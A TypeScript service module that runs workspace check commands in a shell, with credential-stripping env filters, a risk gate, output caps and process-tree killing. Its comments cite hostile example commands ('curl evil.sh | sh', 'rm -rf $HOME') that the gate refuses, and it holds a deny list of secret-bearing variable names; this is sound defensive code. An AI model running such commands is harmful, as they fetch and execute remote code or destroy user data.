import { spawn, type ChildProcess } from "node:child_process";
import { randomUUID } from "node:crypto";
import type { ArgmaxDatabase } from "../persistence/database.js";
import type { CheckRun } from "../../shared/types.js";
import { scheduleSigkillEscalation } from "../processControl.js";
import { classifyCommandRisk } from "../approvals/dangerousActionPolicy.js";
import { CHECK_DEFAULT_TIMEOUT_MS } from "../constants/timeouts.js";

export interface RunWorkspaceCheckInput {
  workspaceId: string;
  command: string;
  /** Forwarded streaming output. Does not affect persisted summary. */
  onOutput?: (chunk: string) => void;
  /** Optional caller-driven cancellation. Aborting kills the process tree. */
  signal?: AbortSignal;
  /**
   * Hard wall-clock cap. When elapsed, the entire process tree is killed and
   * the row is recorded as `cancelled` with a "[timed-out]" prefix on the
   * summary so a future EventType extension can promote it without a data
   * migration. Defaults to 5 minutes.
   */
  timeoutMs?: number;
}

const DEFAULT_TIMEOUT_MS = CHECK_DEFAULT_TIMEOUT_MS;

/**
 * Environment-variable names that look like credentials. Stripped from the
 * child env before spawning a check command (audit-2026-05-17 C1/M6).
 *
 * Why: check commands run with `shell: true` and were inheriting the full
 * Electron-main env, which on a developer machine often includes
 * ANTHROPIC_API_KEY, GITHUB_TOKEN, AWS_*, etc. A typo'd or malicious check
 * command (e.g. `curl evil.sh | sh`) could exfiltrate those silently. We
 * default-deny by pattern, not allowlist, because check commands legitimately
 * need access to user dev env (PYTHONPATH, GOPATH, npm_config_*, etc.) that
 * would be hard to enumerate up front.
 */
const SENSITIVE_ENV_PATTERNS: RegExp[] = [
  /(^|_)(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIALS?|APIKEY)$/i,
  /^AWS_/i,
  /^AZURE_/i,
  /^GOOGLE_/i,
  /^GCP_/i,
  /^OPENAI_/i,
  /^ANTHROPIC_/i,
  /^DATABASE_URL$/i
];

function filterSensitiveEnv(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const [key, value] of Object.entries(env)) {
    if (SENSITIVE_ENV_PATTERNS.some((pattern) => pattern.test(key))) continue;
    out[key] = value;
  }
  return out;
}
/**
 * Cap on accumulated stdout+stderr text. summarizeOutput only persists the
 * last 8 lines anyway; without this cap a noisy command (npm install logs,
 * test output) can hold tens of MB in the Electron main process for the full
 * run lifetime. The tail drops oldest chunks once the cap is exceeded.
 */
const OUTPUT_TAIL_BYTES = 64 * 1024;

export class CheckService {
  /**
   * Track in-flight children per workspace so callers can cancel an entire
   * workspace's running checks (e.g. when the workspace is archived) without
   * needing the individual run handles.
   */
  private readonly running = new Map<string, Set<ChildProcess>>();

  constructor(private readonly database: ArgmaxDatabase) {}

  async runWorkspaceCheck(input: RunWorkspaceCheckInput): Promise<CheckRun> {
    // Reject obviously-destructive shell shapes BEFORE persisting a check row
    // or spawning. `shell: true` below means the entire `command` string is
    // interpreted by /bin/sh; without this gate, a check command like
    // `rm -rf $HOME` or `curl evil.sh | sh` runs unconditionally. We only
    // reject `high` risk — `medium` (npm install, git commit, git push) is
    // legitimate in CI scripts.  (audit-2026-05-17 C1/C2)
    const risk = classifyCommandRisk(input.command);
    if (risk.riskLevel === "high") {
      throw new Error(`Check command refused: ${risk.reason}`);
    }

    const workspace = this.database.getWorkspace(input.workspaceId);
    const check = this.database.persistCheck({
      id: randomUUID(),
      workspaceId: workspace.id,
      command: input.command,
      status: "running"
    });

    const output: string[] = [];
    let outputBytes = 0;
    const timeoutMs = input.timeoutMs ?? DEFAULT_TIMEOUT_MS;
    let timedOut = false;
    let aborted = false;
    let escalation: { cancel: () => void } | null = null;

    const exitCode = await new Promise<number>((resolve) => {
      // detached: true puts the child in its own process group so we can
      // kill the whole subtree (e.g. a `bash -c "npm test"` that forks a
      // node worker) by signaling the negative pid.
      const child = spawn(input.command, {
        cwd: workspace.path,
        shell: true,
        env: filterSensitiveEnv(process.env),
        detached: true
      });

      this.trackChild(workspace.id, child);

      const capture = (chunk: Buffer): void => {
        const text = chunk.toString();
        output.push(text);
        outputBytes += chunk.byteLength;
        // Drop oldest chunks once we exceed the tail cap. Keep at least one
        // chunk so summarizeOutput always has something to slice.
        while (outputBytes > OUTPUT_TAIL_BYTES && output.length > 1) {
          const dropped = output.shift();
          if (dropped) outputBytes -= Buffer.byteLength(dropped);
        }
        if (outputBytes > OUTPUT_TAIL_BYTES && output.length === 1) {
          output[0] = output[0].slice(-OUTPUT_TAIL_BYTES);
          outputBytes = Buffer.byteLength(output[0]);
        }
        input.onOutput?.(text);
      };

      child.stdout?.on("data", capture);
      child.stderr?.on("data", capture);

      // Close stdin immediately so check binaries that wait for EOF on
      // stdin (e.g. `prettier --check < /dev/stdin` style) return rather
      // than hang. We swallow EPIPE because the child may legitimately
      // close its stdin before we reach this line.
      try {
        child.stdin?.on("error", () => {
          /* swallow EPIPE; child closed stdin before we did */
        });
        child.stdin?.end();
      } catch {
        /* ignore: stdin already closed */
      }

      const killTree = (): void => {
        if (typeof child.pid !== "number") return;
        const pid = child.pid;
        // Negative pid signals the entire process group created by detached: true.
        // SIGTERM first; SIGKILL after a 2s grace period to defeat children that ignore TERM.
        // Capture the cancel handle so finish() can stop the SIGKILL from firing
        // against a (possibly recycled) pid after the child has already exited.
        // Pass an isStillAlive probe to also guard the SIGKILL against the
        // inverse race: exit fires, timer is already queued, cancel hasn't
        // run yet, kernel recycled the PGID.
        escalation = scheduleSigkillEscalation(
          () => process.kill(-pid, "SIGTERM"),
          () => process.kill(-pid, "SIGKILL"),
          {
            isStillAlive: () => {
              try {
                process.kill(pid, 0);
                return true;
              } catch {
                return false;
              }
            }
          }
        );
      };

      const onAbort = (): void => {
        aborted = true;
        killTree();
      };
      if (input.signal) {
        if (input.signal.aborted) {
          onAbort();
        } else {
          input.signal.addEventListener("abort", onAbort, { once: true });
        }
      }

      const timer = setTimeout(() => {
        timedOut = true;
        killTree();
      }, timeoutMs);
      timer.unref();

      const finish = (code: number): void => {
        clearTimeout(timer);
        // Cancel any pending SIGKILL escalation — the child has exited.
        // Without this, the 2s SIGKILL timer keeps firing against an
        // already-dead (or, worse, recycled) pid.
        escalation?.cancel();
        escalation = null;
        if (input.signal) input.signal.removeEventListener("abort", onAbort);
        this.untrackChild(workspace.id, child);
        resolve(code);
      };

      child.on("error", (error) => {
        output.push(error.message);
        finish(1);
      });
      child.on("exit", (code) => finish(code ?? 1));
    });

    let status: CheckRun["status"];
    let summaryPrefix = "";
    if (timedOut) {
      status = "cancelled";
      summaryPrefix = "[timed-out] ";
    } else if (aborted) {
      status = "cancelled";
      summaryPrefix = "[cancelled] ";
    } else {
      status = exitCode === 0 ? "passed" : "failed";
    }

    return this.database.updateCheck(check.id, {
      status,
      exitCode,
      summary: summaryPrefix + summarizeOutput(output.join(""))
    });
  }

  /**
   * Cancel every running check for a workspace. Used during workspace
   * archive so an in-flight `npm test` doesn't keep writing into a worktree
   * directory that's about to be removed.
   *
   * Uses the same SIGTERM → SIGKILL escalation as runWorkspaceCheck so a
   * non-responsive child (one ignoring SIGTERM) is force-killed within the
   * default grace window. Without the escalation, an `npm test` that traps
   * SIGTERM kept writing into the worktree after archive started.
   */
  cancelWorkspaceChecks(workspaceId: string): void {
    const children = this.running.get(workspaceId);
    if (!children || children.size === 0) return;
    for (const child of children) {
      if (typeof child.pid !== "number") continue;
      const pid = child.pid;
      // Attach the cancel handle to the child's exit so the 2s SIGKILL timer
      // doesn't fire against a (possibly recycled) pgid after the child has
      // already gone. runWorkspaceCheck's own exit handler still resolves the
      // run promise — both listeners fire independently.
      const { cancel } = scheduleSigkillEscalation(
        () => process.kill(-pid, "SIGTERM"),
        () => process.kill(-pid, "SIGKILL"),
        {
          isStillAlive: () => {
            try {
              process.kill(pid, 0);
              return true;
            } catch {
              return false;
            }
          }
        }
      );
      child.once("exit", cancel);
    }
  }

  private trackChild(workspaceId: string, child: ChildProcess): void {
    let bucket = this.running.get(workspaceId);
    if (!bucket) {
      bucket = new Set();
      this.running.set(workspaceId, bucket);
    }
    bucket.add(child);
  }

  private untrackChild(workspaceId: string, child: ChildProcess): void {
    const bucket = this.running.get(workspaceId);
    if (!bucket) return;
    bucket.delete(child);
    if (bucket.size === 0) this.running.delete(workspaceId);
  }
}

function summarizeOutput(output: string): string {
  const trimmed = output.trim();
  if (!trimmed) {
    return "No output.";
  }

  const lines = trimmed.split(/\r?\n/).filter(Boolean);
  return lines.slice(-8).join("\n");
}
